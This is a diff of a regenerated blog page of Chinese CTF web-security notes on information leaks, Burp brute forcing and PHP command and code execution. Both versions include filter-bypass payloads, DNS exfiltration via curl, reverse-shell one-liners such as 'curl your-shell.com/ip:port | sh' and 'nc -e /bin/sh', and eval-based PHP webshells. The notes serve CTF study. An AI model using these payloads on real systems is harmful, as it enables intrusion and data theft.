@@ -19,12 +19,12 @@
   <meta name="author" content="rainstar">
   <meta name="keywords" content="">
   
-    <meta name="description" content="[TOC] 认识漏洞 术语： poc：证明漏洞存在；exp：漏洞利用脚本 漏洞利用方式  失能：拒绝服务(DOS) 读取：读取敏感文件（文件包含）；读取数据库信息（SQL注入） 写入：篡改数据；提权；加密硬盘 执行：执行命令；内网渗透；反弹shell  做题思路  判断利用的漏洞方式为读取、写入还是执行，不能马上确定，从低到高依次挖掘。 判断漏洞大概的类型。例如：登录逻">
+    <meta name="description" content="[TOC] 认识漏洞 术语： poc：证明漏洞存在；exp：漏洞利用脚本 漏洞利用方式  失能：拒绝服务(DOS) 读取：读取敏感文件（文件包含）；读取数据库信息（SQL注入） 写入：篡改数据；提权；加密硬盘 执行：执行命令；内网渗透；反弹shell  做题思路  判断利用的漏洞方式为读取、写入还是执行，不能马上确定，从低到高依次挖掘。 判断漏洞大概的类型。例如：登录逻辑，尝试sql注入；下载逻辑">
 <meta property="og:type" content="article">
 <meta property="og:title" content="Web">
 <meta property="og:url" content="https://rain00star.github.io/2024/12/03/Web/index.html">
 <meta property="og:site_name" content="RainStar&#39;s Blog">
-<meta property="og:description" content="[TOC] 认识漏洞 术语： poc：证明漏洞存在；exp：漏洞利用脚本 漏洞利用方式  失能：拒绝服务(DOS) 读取：读取敏感文件（文件包含）；读取数据库信息（SQL注入） 写入：篡改数据；提权；加密硬盘 执行：执行命令；内网渗透；反弹shell  做题思路  判断利用的漏洞方式为读取、写入还是执行，不能马上确定，从低到高依次挖掘。 判断漏洞大概的类型。例如：登录逻">
+<meta property="og:description" content="[TOC] 认识漏洞 术语： poc：证明漏洞存在；exp：漏洞利用脚本 漏洞利用方式  失能：拒绝服务(DOS) 读取：读取敏感文件（文件包含）；读取数据库信息（SQL注入） 写入：篡改数据；提权；加密硬盘 执行：执行命令；内网渗透；反弹shell  做题思路  判断利用的漏洞方式为读取、写入还是执行，不能马上确定，从低到高依次挖掘。 判断漏洞大概的类型。例如：登录逻辑，尝试sql注入；下载逻辑">
 <meta property="og:locale" content="en_US">
 <meta property="og:image" content="https://rain00star.github.io/2024/12/03/Web/1733115011030.png">
 <meta property="og:image" content="https://rain00star.github.io/2024/12/03/Web/1733230982721.png">
@@ -331,7 +331,7 @@
 <li>执行：执行命令；内网渗透；反弹shell</li>
 </ul>
 <h3 id="做题思路">做题思路</h3>
-<ol type="1">
+<ol>
 <li>判断利用的漏洞方式为<strong>读取、写入还是执行</strong>，不能马上确定，从低到高依次挖掘。</li>
 <li>判断漏洞大概的类型。例如：登录逻辑，尝试sql注入；下载逻辑，尝试文件读取；给源码做代码审计。</li>
 <li>寻找敏感数据</li>
@@ -372,12 +372,12 @@
 <p>通过报错信息泄露服务器状态</p>
 <h4 id="页面信息泄露">页面信息泄露</h4>
 <p>查看页面源代码、控制台等</p>
-<h4 id="robots.txt敏感文件泄露">robots.txt敏感文件泄露</h4>
+<h4 id="robots-txt敏感文件泄露">robots.txt敏感文件泄露</h4>
 <p>爬虫协议，规定哪些内容不能访问（正规的搜索引擎爬虫都会遵守），但没有任何强制约束力。</p>
 <p>格式：</p>
 <p>User-agent：每个搜索引擎的爬虫标识</p>
 <p>Disallow：不允许访问哪些链接</p>
-<p>Disallow：.......</p>
+<p>Disallow：…</p>
 <h4 id="git文件泄露">.git文件泄露</h4>
 <p>版本控制系统（版本号）</p>
 <p>githack脚本利用(windows)：[遇到403禁止时，可以尝试]</p>
@@ -385,33 +385,32 @@
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">python .\GitHack.py -u <span class="hljs-string">&quot;https://xxxx/.git/&quot;</span><br></code></pre></td></tr></table></figure>
 <h4 id="搜索引擎文件泄露">搜索引擎文件泄露</h4>
 <p>(百度)<code>intitle:xx后台登录</code>标题</p>
-<p>(fofa网络安全搜索引擎)<code>title="xx"文件上传</code>标题</p>
+<p>(fofa网络安全搜索引擎)<code>title=&quot;xx&quot;文件上传</code>标题</p>
 <h3 id="总结">总结</h3>
-<ol type="1">
+<ol>
 <li><code>robots.txt</code>泄露</li>
-<li><code>.git/</code>
-<code>.svn/</code>泄露（访问目录出现403访问禁止）</li>
+<li><code>.git/ </code> <code>.svn/</code>泄露（访问目录出现403访问禁止）</li>
 <li>源代码泄露、http头泄露</li>
 <li><strong>任意文件下载造成的信息泄露</strong></li>
 <li>开源社区信息泄露，例如：泄露项目名称，整个项目代码可以在github等找到</li>
 <li>使用vim异常退出，造成类似<code>index.php.swp</code>临时文件</li>
 </ol>
-<h2 id="burpsuite与爆破">Burpsuite与爆破</h2>
+<h2 id="Burpsuite与爆破">Burpsuite与爆破</h2>
 <p>爆破-&gt;防止：验证码；</p>
 <p>8位字符-&gt;76亿年，不到万不得已不用；</p>
-<ol type="1">
+<ol>
 <li>单个位置：sniper</li>
 <li>两个位置：cluster bomb，两个simplist导入两个payload</li>
 <li>http认证爆破：输入的字符经过编码处理，例如admin:123456(经过base64编码)：payload导入password字典，在payload处理里加入前缀和编码，取消url编码</li>
 </ol>
-<h2 id="php的代码执行rce">php的代码执行（RCE）</h2>
+<h2 id="php的代码执行（RCE）">php的代码执行（RCE）</h2>
 <h3 id="php基础知识">php基础知识</h3>
-<h4 id="get包转post包">GET包转POST包</h4>
+<h4 id="GET包转POST包">GET包转POST包</h4>
 <p>bp中get转post，使用<code>change</code>快捷键</p>
 <p>修改三处：GET-&gt;POST，增加Content-Type，Content-Length</p>
 <h4 id="php自定义函数">php自定义函数</h4>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br> <br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">add</span>(<span class="hljs-params"><span class="hljs-variable">$a</span>,<span class="hljs-variable">$b</span></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable">$a</span>+<span class="hljs-variable">$b</span>;<br>    &#125;<br>    <span class="hljs-variable">$a</span>=<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;a&#x27;</span>];<br>    <span class="hljs-variable">$b</span>=<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;b&#x27;</span>];<br>    <span class="hljs-variable">$c</span>=<span class="hljs-title function_ invoke__">add</span>(<span class="hljs-variable">$a</span>,<span class="hljs-variable">$b</span>);<br>    <span class="hljs-keyword">echo</span> <span class="hljs-variable">$c</span>;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
-<h3 id="php的命令执行执行操作系统的命令">php的命令执行(执行操作系统的命令)</h3>
+<h3 id="php的命令执行-执行操作系统的命令">php的命令执行(执行操作系统的命令)</h3>
 <h4 id="可以执行系统命令的函数">可以执行系统命令的函数</h4>
 <ul>
 <li>system[相当于cmd，只能执行系统命令，不能执行phpinfo();]</li>
@@ -425,7 +424,7 @@
 <p>windows下可以执行的命令：calc,bat,vbs等</p>
 <p>linux下可以执行的命令：cat,cp,nc,whoami等</p>
 <h4 id="几种类型">几种类型</h4>
-<p>例如：ping -c 1 www.baidu.com</p>
+<p>例如：ping -c 1 <a target="_blank" rel="noopener" href="http://www.baidu.com">www.baidu.com</a></p>
 <ul>
 <li>命令可控 例如ping</li>
 <li>参数可控 -c可控</li>
@@ -450,18 +449,11 @@
 <p>命令重定向操作，同时丢弃标准输出和标准错误，不会有任何回显。</p>
 <ul>
 <li><strong>&gt;</strong>：这是输出重定向操作符。它将标准输出（stdout）重定向到指定的位置。</li>
-<li><strong>/dev/null</strong>：这是一个特殊的文件，通常被称为“黑洞”。任何写入这个文件的数据都会被丢弃。将输出重定向到
-<code>/dev/null</code> 意味着放弃该输出。</li>
-<li>1 表示stdout标准输出，系统默认值是1，所以"&gt;/dev/null"等同于
-“1&gt;/dev/null”</li>
-<li><strong>2&gt;&amp;1</strong>：这是将标准错误（stderr，文件描述符2）重定向到标准输出（stdout，文件描述符1）的操作。<strong><code>2</code>
-表示标准错误，<code>1</code>
-表示标准输出</strong>。<code>&gt;&amp;</code>
-表示将一个文件描述符的输出重定向到另一个文件描述符。由于标准输出已经被重定向到
-<code>/dev/null</code>，因此标准错误也会被重定向到同样的地方，最终也被丢弃。</li>
+<li><strong>/dev/null</strong>：这是一个特殊的文件，通常被称为“黑洞”。任何写入这个文件的数据都会被丢弃。将输出重定向到 <code>/dev/null</code> 意味着放弃该输出。</li>
+<li>1 表示stdout标准输出，系统默认值是1，所以&quot;&gt;/dev/null&quot;等同于 “1&gt;/dev/null”</li>
+<li><strong>2&gt;&amp;1</strong>：这是将标准错误（stderr，文件描述符2）重定向到标准输出（stdout，文件描述符1）的操作。<strong><code>2</code> 表示标准错误，<code>1</code> 表示标准输出</strong>。<code>&gt;&amp;</code> 表示将一个文件描述符的输出重定向到另一个文件描述符。由于标准输出已经被重定向到 <code>/dev/null</code>，因此标准错误也会被重定向到同样的地方，最终也被丢弃。</li>
 </ul>
-<p>解题：使用<code>;</code> <code>||</code> <code>&amp;&amp;</code>
-进行命令分隔即可。</p>
+<p>解题：使用<code>;</code>  <code>||</code>  <code>&amp;&amp;</code> 进行命令分隔即可。</p>
 <h4 id="整体可控">整体可控</h4>
 <h5 id="黑名单过滤">黑名单过滤</h5>
 <ul>
@@ -471,45 +463,44 @@
 <ul>
 <li>过滤特定字符串：过滤flag等关键字</li>
 </ul>
-<p>策略：使用通配符（<code>*</code>
-<code>?</code>）绕过，其中<code>*</code>表示任意长度字符，<code>？</code>表示一个字符。</p>
+<p>策略：使用通配符（<code>*</code> <code>?</code>）绕过，其中<code>*</code>表示任意长度字符，<code>？</code>表示一个字符。</p>
 <p>常见命令，批量移动文件，使用命令：<code>mv *.txt ./tmp</code></p>
 <h6 id="通配符">通配符</h6>
 <p>代码审计：</p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>    <span class="hljs-variable">$cmd</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;cmd&#x27;</span>];<br>    <span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/flag|\&amp;|\;/i&quot;</span>,<span class="hljs-variable">$cmd</span>))  <span class="hljs-comment">//！preg_match()表示没有匹配到</span><br>    &#123;<br>        <span class="hljs-title function_ invoke__">system</span>(<span class="hljs-variable">$cmd</span>.<span class="hljs-string">&quot;&gt;/dev/null 2&gt;&amp;1&quot;</span>);<br>    &#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
 <ul>
 <li>preg_match(rules,string) : 前面为匹配规则，后面为要匹配的字符串</li>
-<li>规则详谈：主要是3部分<code>/flag</code> <code>\&amp;</code>
-<code>\;</code>
-，中间使用<code>|</code>表示或的关系，<code>/i</code>是一种模式，表示不区分大小写；</li>
-<li><code>/flag</code>
-：表示<strong>部分匹配</strong>flag字符串（包括myflag,flagggg等）
-；完全匹配的格式<code>/^flag$</code>(不包括myflag...)</li>
-<li><code>\&amp;</code>
-：表示部分匹配&amp;符号，由于&amp;是一个特殊字符，所以需要加</li>
+<li>规则详谈：主要是3部分<code>/flag</code>  <code>\&amp;</code>  <code>\;</code>  ，中间使用<code>|</code>表示或的关系，<code>/i</code>是一种模式，表示不区分大小写；</li>
+<li><code>/flag</code>  ：表示<strong>部分匹配</strong>flag字符串（包括myflag,flagggg等）  ；完全匹配的格式<code>/^flag$</code>(不包括myflag…)</li>
+<li><code>\&amp;</code> ：表示部分匹配&amp;符号，由于&amp;是一个特殊字符，所以需要加\进行转义</li>
 <li><code>\;</code>同上</li>
 </ul>
 <p>解题：使用通配符绕过即可。</p>
-<h6 id="更多命令执行和base64编码">更多命令，``执行和base64编码</h6>
-<p>过滤<code>cat</code> <code>more</code>等文件读取命令：</p>
+<h6 id="更多命令，-执行和base64编码">更多命令，``执行和base64编码</h6>
+<p>过滤<code>cat</code>  <code>more</code>等文件读取命令：</p>
 <p>解法一：（更多命令）tac nl od等</p>
 <ul>
-<li><p>cat example.txt</p></li>
-<li><p>tac example.txt</p></li>
-<li><p>more
-example.txt：分页显示文件内容，space翻页，enter向下滚动一行，b向上翻页，q退出</p></li>
-<li><p>nl example.txt ：显示文件内容，同时在每一行前加上行号</p></li>
-<li><p>od -c example.txt ：以字符形式显示</p>
+<li>
+<p>cat example.txt</p>
+</li>
+<li>
+<p>tac example.txt</p>
+</li>
+<li>
+<p>more example.txt：分页显示文件内容，space翻页，enter向下滚动一行，b向上翻页，q退出</p>
+</li>
+<li>
+<p>nl example.txt ：显示文件内容，同时在每一行前加上行号</p>
+</li>
+<li>
+<p>od -c example.txt ：以字符形式显示</p>
 <p>od -x example.txt ：以十六进制形式显示</p>
-<p>od -d example.txt ：以十进制形式显示</p></li>
+<p>od -d example.txt ：以十进制形式显示</p>
+</li>
 </ul>
 <p>解法二：利用``可执行命令进行命令组合执行</p>
-<figure>
-<img src="/2024/12/03/Web/1733115011030.png" srcset="/img/loading.gif" lazyload alt="1733115011030">
-<figcaption aria-hidden="true">1733115011030</figcaption>
-</figure>
-<p>可利用编码解码进行绕过echo 'base64_en(cat flag.php)'|base64
--d（外加``）</p>
+<p><img src="/2024/12/03/Web/1733115011030.png" srcset="/img/loading.gif" lazyload alt="1733115011030"></p>
+<p>可利用编码解码进行绕过echo ‘base64_en(cat flag.php)’|base64 -d（外加``）</p>
 <h6 id="变量拼接过滤关键字">变量拼接过滤关键字</h6>
 <p>cat flag.php 等价：</p>
 <p><code>cmd = a=c;b=at;c=fla;d=g.php;$a$b $&#123;c&#125;$&#123;d&#125;</code></p>
@@ -517,33 +508,31 @@ example.txt：分页显示文件内容，space翻页，enter向下滚动一行�
 <p>eval()里好像不能进行拼接？？？</p>
 <h5 id="符号过滤">符号过滤</h5>
 <h6 id="空格过滤">空格过滤</h6>
-<ol type="1">
+<ol>
 <li><strong>读文件</strong>，用&lt;&gt;代替空格</li>
 <li>使用<code>$&#123;IFS&#125;</code>或者<code>$IFS$9</code>来代替空格，bash下甚至可用{cmd,args}来代替空格</li>
-<li>控制字符代替空格（<code>%09</code> <code>%0b</code>
-<code>%0c</code>） -&gt; 过滤 </li>
+<li>控制字符代替空格（<code>%09</code> <code>%0b</code> <code>%0c</code>） -&gt; 过滤 \x09</li>
 <li>字符串截取空格：</li>
 </ol>
 <figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-comment">#功能介绍</span><br><span class="hljs-attribute">cmd</span>=aabbcc<br><span class="hljs-variable">$&#123;cmd&#125;</span><br><span class="hljs-comment">#输出aabbcc</span><br><br><span class="hljs-variable">$&#123;cmd:2&#125;</span><br><span class="hljs-comment">#输出bbcc</span><br><br><span class="hljs-variable">$&#123;cmd:4:1&#125;</span><br><span class="hljs-comment">#输出c</span><br></code></pre></td></tr></table></figure>
 <p>从环境变量<code>cmd=env</code>截取空格，环境变量开头为<code>环境变量名=</code>，利用<code>$&#123;环境变量名&#125;</code>使用</p>
-<h4 id="无回显命令执行shell_exec">无回显命令执行shell_exec()</h4>
+<h4 id="无回显命令执行shell-exec">无回显命令执行shell_exec()</h4>
 <h5 id="写通道">写通道</h5>
 <figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs dockerfile">url/?<span class="hljs-keyword">cmd</span><span class="language-bash">=<span class="hljs-built_in">ls</span> &gt; 1.txt</span><br>访问：<br>url/<span class="hljs-number">1</span>.txt<br></code></pre></td></tr></table></figure>
-<h5 id="dns通道">DNS通道</h5>
+<h5 id="DNS通道">DNS通道</h5>
 <p>一些网站可获取dnslog信息</p>
 <figure class="highlight autohotkey"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs autohotkey">url/?cmd=ping -c <span class="hljs-number">1</span> `whoami`.xx.xx(获取的二级域名)<br></code></pre></td></tr></table></figure>
 <p>可能出现行数有限的情况；可以分段获取信息：</p>
 <figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">url/?<span class="hljs-attribute">cmd</span>=a=`sed -n <span class="hljs-string">&quot;3,4p&quot;</span> 1.txt`;curl <span class="hljs-variable">$&#123;a:0:10 |base64&#125;</span>.xx.xx;<br></code></pre></td></tr></table></figure>
 <ul>
-<li>首先是<code>sed -n "3,4p" 1.txt</code> :</li>
+<li>首先是<code>sed -n &quot;3,4p&quot; 1.txt</code> :</li>
 </ul>
 <p>sed：是一个流编辑器，用于对文本进行处理和转换。</p>
-<p>-n：告诉 sed 不要自动打印每一行的输出。默认情况下，sed
-会打印所有处理过的行，使用 -n 选项后，只有明确指定的行才会被打印。</p>
-<p>3,4：指定要处理的行范围，从第 3 行到第 4 行。
+<p>-n：告诉 sed 不要自动打印每一行的输出。默认情况下，sed 会打印所有处理过的行，使用 -n 选项后，只有明确指定的行才会被打印。</p>
+<p>3,4：指定要处理的行范围，从第 3 行到第 4 行。<br>
 p：表示打印匹配到的行。</p>
-<p>1.txt：是要处理的输入文件名。 结合起来，这条命令的作用是从文件 1.txt
-中提取并打印出第 3 行和第 4 行的内容。</p>
+<p>1.txt：是要处理的输入文件名。<br>
+结合起来，这条命令的作用是从文件 1.txt 中提取并打印出第 3 行和第 4 行的内容。</p>
 <ul>
 <li><code>curl</code>命令，模拟向服务器发送请求</li>
 <li>可进行base64编码</li>
@@ -555,11 +544,11 @@ p：表示打印匹配到的行。</p>
 <p>现在访问好像获取不了子域名，等待尝试。</p>
 <h5 id="反弹shell信道">反弹shell信道</h5>
 <p>（需要有公网IP）</p>
-<ol type="1">
-<li>借助your-shell.com:</li>
+<ol>
+<li><a target="_blank" rel="noopener" href="http://xn--your-shell-db7py7v.com">借助your-shell.com</a>:</li>
 </ol>
 <figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs vim">curl https://your-<span class="hljs-keyword">shell</span>.<span class="hljs-keyword">com</span>/yourip:port_num | <span class="hljs-keyword">sh</span><br>监听端监听对应端口:<br>nc -lvvnp port_num<br></code></pre></td></tr></table></figure>
-<ol start="2" type="1">
+<ol start="2">
 <li>直接输入命令：</li>
 </ol>
 <figure class="highlight elm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs elm">攻击端：<br><span class="hljs-title">nc</span> <span class="hljs-type">IP</span> port_num -e /bin/sh<br>监听端：<br><span class="hljs-title">nc</span> -lvvnp port_num<br></code></pre></td></tr></table></figure>
@@ -567,27 +556,25 @@ p：表示打印匹配到的行。</p>
 <p>可用于验证命令是否成功执行</p>
 <figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dockerfile">？<span class="hljs-keyword">cmd</span><span class="language-bash">=<span class="hljs-built_in">sleep</span> 3</span><br></code></pre></td></tr></table></figure>
 <h4 id="绕过总结">绕过总结</h4>
-<ol type="1">
+<ol>
 <li>双写绕过</li>
 <li>通配符绕过？ *</li>
 <li>命令替换</li>
 <li>整体编码</li>
 <li>拼接关键字</li>
-<li>符号过滤：空格（1. 文件：&lt;&gt; 2. ${IFS} 3. 控制字符：%09 4.
-环境变量截取 ）</li>
+<li>符号过滤：空格（1. 文件：&lt;&gt;  2. ${IFS} 3. 控制字符：%09 4. 环境变量截取 ）</li>
 </ol>
-<h3 id="php的代码执行执行php代码">php的代码执行（执行php代码）</h3>
+<h3 id="php的代码执行（执行php代码）">php的代码执行（执行php代码）</h3>
 <h4 id="可以执行php代码的函数">可以执行php代码的函数</h4>
-<p>eval() :
-把一串字符当作php代码执行，可以转为命令执行<code>code=system('')</code></p>
+<p>eval() : 把一串字符当作php代码执行，可以转为命令执行<code>code=system('')</code></p>
 <p>call_user_func()：把第一个参数作为回调函数调用，代码举例如下：</p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">error_reporting</span>(E_ALL);<br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">increment</span>(<span class="hljs-params">&amp;<span class="hljs-variable">$var</span></span>)</span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-variable">$var</span>++;<br>&#125;<br><br><span class="hljs-variable">$a</span> = <span class="hljs-number">0</span>;<br><span class="hljs-title function_ invoke__">call_user_func</span>(<span class="hljs-string">&#x27;increment&#x27;</span>, <span class="hljs-variable">$a</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$a</span>.<span class="hljs-string">&quot;\n&quot;</span>;<br><br><span class="hljs-title function_ invoke__">call_user_func_array</span>(<span class="hljs-string">&#x27;increment&#x27;</span>, <span class="hljs-keyword">array</span>(&amp;<span class="hljs-variable">$a</span>)); <span class="hljs-comment">// You can use this instead before PHP 5.3</span><br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$a</span>.<span class="hljs-string">&quot;\n&quot;</span>;<br><span class="hljs-meta">?&gt;</span> <br>    <br><span class="hljs-comment">//输出0</span><br><span class="hljs-comment">//输出1</span><br></code></pre></td></tr></table></figure>
 <p>call_user_func_array()：调用回调函数，并把一个数组参数作为回调函数的参数，代码实例如下：(简单理解为传递多个参数)</p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">foobar</span>(<span class="hljs-params"><span class="hljs-variable">$arg</span>, <span class="hljs-variable">$arg2</span></span>) </span>&#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-keyword">__FUNCTION__</span>, <span class="hljs-string">&quot; got <span class="hljs-subst">$arg</span> and <span class="hljs-subst">$arg2</span>\n&quot;</span>;<br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">foo</span> </span>&#123;<br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">bar</span>(<span class="hljs-params"><span class="hljs-variable">$arg</span>, <span class="hljs-variable">$arg2</span></span>) </span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-keyword">__METHOD__</span>, <span class="hljs-string">&quot; got <span class="hljs-subst">$arg</span> and <span class="hljs-subst">$arg2</span>\n&quot;</span>;<br>    &#125;<br>&#125;<br><br><br><span class="hljs-comment">// Call the foobar() function with 2 arguments</span><br><span class="hljs-title function_ invoke__">call_user_func_array</span>(<span class="hljs-string">&quot;foobar&quot;</span>, <span class="hljs-keyword">array</span>(<span class="hljs-string">&quot;one&quot;</span>, <span class="hljs-string">&quot;two&quot;</span>));<br><br><span class="hljs-comment">// Call the $foo-&gt;bar() method with 2 arguments</span><br><span class="hljs-variable">$foo</span> = <span class="hljs-keyword">new</span> foo;<br><span class="hljs-title function_ invoke__">call_user_func_array</span>(<span class="hljs-keyword">array</span>(<span class="hljs-variable">$foo</span>, <span class="hljs-string">&quot;bar&quot;</span>), <span class="hljs-keyword">array</span>(<span class="hljs-string">&quot;three&quot;</span>, <span class="hljs-string">&quot;four&quot;</span>));<br><span class="hljs-meta">?&gt;</span> <br></code></pre></td></tr></table></figure>
-<h4 id="eval函数">eval()函数</h4>
+<h4 id="eval-函数">eval()函数</h4>
 <p>一句话木马：</p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>    <span class="hljs-variable">$a</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;cmd&#x27;</span>];<br>    <span class="hljs-keyword">eval</span>(<span class="hljs-variable">$a</span>);<br><span class="hljs-meta">?&gt;</span><br><span class="hljs-comment">//使用蚁剑连接，密码为参数名字`cmd`</span><br>    <br><span class="hljs-meta">&lt;?php</span><br>    <span class="hljs-variable">$a</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;cmd&#x27;</span>];<br>    <span class="hljs-keyword">eval</span>(<span class="hljs-variable">$a</span>);<br><span class="hljs-meta">?&gt;</span><br><span class="hljs-comment">//转接头，蚁剑连接url: xx/?cmd=eval($_POST[&#x27;1&#x27;])</span><br><span class="hljs-comment">//连接密码为1</span><br></code></pre></td></tr></table></figure>
-<h4 id="call_user_fun函数">call_user_fun()函数</h4>
+<h4 id="call-user-fun-函数">call_user_fun()函数</h4>
 <p>第一个参数为回调函数（注意eval、echo不属于函数）；</p>
 <p>eval()可以替换为assert()，在<code>php5</code>中assert()是函数，且与eval()功能相同</p>
 <h4 id="其他函数-查手册">其他函数-查手册</h4>
@@ -595,24 +582,23 @@ p：表示打印匹配到的行。</p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">bool</span> <span class="hljs-title function_ invoke__">array_walk_recursive</span>( <span class="hljs-keyword">array</span> &amp;<span class="hljs-variable">$array</span>, <span class="hljs-keyword">callable</span> <span class="hljs-variable">$callback</span>)<br></code></pre></td></tr></table></figure>
 <p>前面为参数，后面为函数。</p>
 <p><strong>GET传参（数组）：</strong></p>
-<p>例如：$_GET['a']，传入[1,2,3]</p>
+<p>例如：$_GET[‘a’]，传入[1,2,3]</p>
 <p><code>url/?a[]=1&amp;a[]=2&amp;a[]=3</code></p>
-<h4 id="过滤但需要php标记">过滤？但需要php标记</h4>
+<h4 id="过滤？但需要php标记">过滤？但需要php标记</h4>
 <p>使用另一个php标记，这里<code>&lt;/script&gt;</code>表示一个<code>;</code>：（在php语法中，结束标记等于一个；）</p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php">&lt;script language=<span class="hljs-string">&quot;php&quot;</span>&gt;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;some editors (like FrontPage) don\&#x27;t</span><br><span class="hljs-string">              like processing instructions&#x27;</span>;<br>&lt;/script&gt;<br></code></pre></td></tr></table></figure>
 <h4 id="限制命令长度">限制命令长度</h4>
-<ol type="1">
-<li>php标记压缩：<code>&lt;?= ?&gt;</code> <code>&lt;?=  ;&gt;</code>
-<code>&lt;?   ;</code></li>
+<ol>
+<li>php标记压缩：<code>&lt;?= ?&gt;</code>  <code>&lt;?=  ;&gt;</code>  <code>&lt;?   ;</code></li>
 <li>构造payload:</li>
 </ol>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?</span>`<span class="hljs-variable">$_GET</span>[<span class="hljs-number">1</span>]`&amp;<span class="hljs-number">1</span>=sleep3;<br></code></pre></td></tr></table></figure>
-<ol start="3" type="1">
+<ol start="3">
 <li>该payload无回显，参考无回显的命令执行</li>
 </ol>
 <h4 id="蚁剑用法探索">蚁剑用法探索</h4>
 <p>题目描述，过滤eval,request,include，phpinfo()表明配置中还禁止了一些系统执行函数</p>
-<ol type="1">
+<ol>
 <li>替换为assert()函数，且使用base64编码</li>
 <li>遇到虚拟终端无回显：插件<code>disable_function</code>多模式尝试</li>
 </ol>
@@ -624,9 +610,8 @@ p：表示打印匹配到的行。</p>
 <p>利用异或，取反，自增，或等操作将非字母数字符号进行运算构造出字母或者数字（对应脚本）</p>
 <h2 id="php文件包含">php文件包含</h2>
 <h3 id="基础知识">基础知识</h3>
-<p>include
-"路径"：包含并运行路径下的文件；如果文件内容包含php标记，会直接运行该php代码，如果没有，会直接按照文本输出</p>
-<h4 id="php文件包含函数语言结构">php文件包含函数、语言结构</h4>
